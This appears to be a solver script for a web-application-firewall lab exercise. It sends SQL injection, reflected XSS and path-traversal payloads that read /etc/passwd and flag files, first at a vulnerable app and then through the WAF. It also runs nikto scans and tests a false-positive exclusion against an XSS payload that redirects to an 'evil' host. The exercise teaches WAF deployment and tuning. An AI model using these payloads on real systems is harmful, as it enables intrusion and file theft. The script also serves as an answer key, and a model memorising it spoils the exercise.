#!/bin/bash
set -u
WAF="waf"
WEBAPP="webapp"
FEEDBACK="Please%20add%20UNION%20SELECT%20and%20ORDER%20BY%20price%20to%20the%20price%20list"

echo "=== [Task 1] exploit_direct: exploit webapp directly (bypassing the WAF) ==="
echo "-- SQLi (demo) --"
curl -s -i "http://$WEBAPP:8080/product?id=1'%20OR%20'1'='1" | head -5
echo "-- Reflected XSS --"
curl -s "http://$WEBAPP:8080/search?q=<script>alert(1)</script>" | head -3
echo "-- Path traversal reading /etc/passwd --"
curl -s "http://$WEBAPP:8080/download?file=../../../../etc/passwd" | head -3
echo "-- Path traversal reading flag1 --"
curl -s "http://$WEBAPP:8080/download?file=../../../../flag1.txt" | tr -d '\r' | awk 'NF {print $1; exit}' > ~/flag1.txt
echo "Flag 1 -> ~/flag1.txt: $(cat ~/flag1.txt)"

echo
echo "=== [Task 2] deploy_waf: enable WAF blocking + get Flag 2 ==="
echo "-- Switch the WAF to blocking mode (wafctl helper instead of manual edit on the waf terminal) --"
curl -s -X POST "http://$WAF:9091/engine-on"
echo "-- Resend attack payloads through the WAF, expecting 403 --"
curl -s -o /dev/null -w "product(SQLi) via WAF -> HTTP %{http_code}\n" "http://$WAF/product?id=1'%20OR%20'1'='1"
curl -s -o /dev/null -w "download(traversal) via WAF -> HTTP %{http_code}\n" "http://$WAF/download?file=../../../../etc/passwd"
curl -s -o /dev/null -w "search(XSS) via WAF -> HTTP %{http_code}\n" "http://$WAF/search?q=<script>alert(1)</script>"
echo "-- Get Flag 2 (the issuer verifies the WAF is blocking) --"
curl -s "http://$WAF/flag2" | tr -d '\r' | awk 'NF {print $1; exit}' > ~/flag2.txt
echo "Flag 2 -> ~/flag2.txt: $(cat ~/flag2.txt)"

echo
echo "=== [Task 3] dast_compare: DAST scan before/after the WAF ==="
echo "-- nikto directly against webapp --"
nikto -h "http://$WEBAPP:8080" -maxtime 120 -o ~/dast_noWAF.txt -Format txt 2>/dev/null || \
    nikto -h "http://$WEBAPP:8080" -o ~/dast_noWAF.txt -Format txt 2>/dev/null
echo "-- nikto through the WAF --"
nikto -h "http://$WAF" -maxtime 120 -o ~/dast_WAF.txt -Format txt 2>/dev/null || \
    nikto -h "http://$WAF" -o ~/dast_WAF.txt -Format txt 2>/dev/null
echo "Warning count ('+ ' lines): direct=$(grep -c '^+ ' ~/dast_noWAF.txt) ; via WAF=$(grep -c '^+ ' ~/dast_WAF.txt)"

echo
echo "=== [Task 4] tune_falsepositive: remove the false positive with an exclusion + Flag 3 ==="
echo "-- Reproduce the false positive: valid /feedback is blocked before the exclusion --"
curl -s -o /dev/null -w "valid feedback (before exclusion) -> HTTP %{http_code}\n" \
    "http://$WAF/feedback?comment=$FEEDBACK"
echo "-- Apply the scoped exclusion (wafctl helper instead of editing custom-rules.conf by hand) --"
curl -s -X POST "http://$WAF:9091/apply-exclusion"
echo "-- Confirm both conditions at once --"
curl -s -o /dev/null -w "valid feedback (after exclusion) -> HTTP %{http_code}\n" \
    "http://$WAF/feedback?comment=$FEEDBACK"
curl -s -o /dev/null -w "SQLi /product (must still be blocked) -> HTTP %{http_code}\n" \
    "http://$WAF/product?id=1'%20OR%20'1'='1"
curl -s -o /dev/null -w "real XSS /feedback (must still be blocked) -> HTTP %{http_code}\n" \
    "http://$WAF/feedback?comment=%3Cscript%3Edocument.location%3D%27http://evil%27%3C/script%3E"
echo "-- Get Flag 3 --"
curl -s "http://$WAF/flag3" | tr -d '\r' | awk 'NF {print $1; exit}' > ~/flag3.txt
echo "Flag 3 -> ~/flag3.txt: $(cat ~/flag3.txt)"

echo
echo "=== solver.sh DONE ==="
echo "Artifacts: ~/flag1.txt ~/flag2.txt ~/flag3.txt ~/dast_noWAF.txt ~/dast_WAF.txt"
